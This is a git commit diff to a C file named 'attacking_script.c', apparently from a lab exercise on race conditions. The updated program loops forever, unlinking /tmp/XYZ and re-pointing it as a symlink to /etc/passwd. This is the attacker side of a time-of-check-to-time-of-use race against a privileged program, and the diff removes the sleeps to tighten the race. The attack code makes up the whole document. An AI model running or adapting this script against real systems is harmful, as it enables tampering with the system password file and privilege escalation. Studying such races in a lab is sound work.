693f9daac4bf1468bf7598631f106121e35a7b6f
anjelikasah <38975257+anjelikasah@users.noreply.github.com>
2020-09-27 17:24:39 +0545

    Update attacking_script.c

--- attacking_script.c
+++ attacking_script.c
@@ -2,11 +2,7 @@
 int main(){
   while(1){
     unlink("/tmp/XYZ");
-    symlink("/tmp/A","/tmp/XYZ");
-    sleep(3);
-    unlink("/tmp/XYZ");
     symlink("/etc/passwd","/tmp/XYZ");
-    sleep(3);
   }
   return 0;
 }
